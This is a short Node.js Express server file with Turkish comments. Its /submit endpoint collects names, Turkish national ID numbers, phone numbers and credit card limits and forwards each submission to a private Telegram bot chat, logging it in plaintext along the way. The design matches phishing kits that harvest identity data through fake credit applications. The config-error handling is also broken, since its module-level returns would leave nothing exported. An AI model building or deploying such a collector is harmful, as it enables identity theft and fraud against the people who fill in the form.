const express = require('express');
const axios = require('axios');
const cors = require('cors');
const dotenv = require('dotenv');

dotenv.config();
const app = express();

// İzin verilen origin (Vercel Dashboard veya .env dosyasından alınır)
const allowedOrigin = process.env.ALLOWED_ORIGIN;

if (!allowedOrigin) {
  console.error('Hata: ALLOWED_ORIGIN ortam değişkeni eksik.');
  return (req, res) => res.status(500).json({ error: 'Sunucu yapılandırma hatası: ALLOWED_ORIGIN tanımlı değil.' });
}

// CORS ayarları: Sadece izin verilen origin'e izin ver
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || origin === allowedOrigin) {
      callback(null, true);
    } else {
      callback(new Error(`Bu origin’den gelen istekler izin verilmiyor: ${origin}`));
    }
  },
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
}));

// OPTIONS isteklerini ele al
app.options('/submit', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.status(200).send();
});

app.use(express.json());

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

if (!botToken || !chatId) {
  console.error('Hata: BOT_TOKEN veya CHAT_ID eksik.');
  return (req, res) => res.status(500).json({ error: 'Sunucu yapılandırma hatası.' });
}

// Test endpoint’i
app.get('/test', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
  res.status(200).json({ message: 'Backend çalışıyor, CORS aktif.', allowedOrigin });
});

// POST istekleri
app.post('/submit', async (req, res) => {
  console.log('POST /submit isteği alındı:', req.body);
  const { isim, soyisim, tc, tel, kredi_karti_limiti } = req.body;

  if (!isim || !soyisim || !tc || !tel || !kredi_karti_limiti) {
    console.error('[Backend] Eksik veri:', { isim, soyisim, tc, tel, kredi_karti_limiti });
    return res.status(400).json({ error: 'Tüm alanlar (isim, soyisim, T.C., telefon, kredi kartı limiti) zorunludur.' });
  }

  const message = `
Yeni Başvuru:
İsim: ${isim}
Soyisim: ${soyisim}
T.C. Kimlik No: ${tc}
Telefon: ${tel}
Kredi Kartı Limiti: ${kredi_karti_limiti}
  `;
  console.log('[Backend] Telegram’a gönderilecek mesaj:', message);

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  try {
    const response = await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    });
    console.log('[Backend] Telegram mesajı gönderildi:', response.data);
    return res.status(200).json({ message: 'Bilgiler Telegram botuna gönderildi.' });
  } catch (error) {
    console.error('[Backend] Telegram mesajı gönderilemedi:', {
      message: error.message,
      response: error.response ? error.response.data : null,
    });
    return res.status(500).json({ error: 'Telegram mesajı gönderilemedi.', details: error.message });
  }
});

module.exports = app;
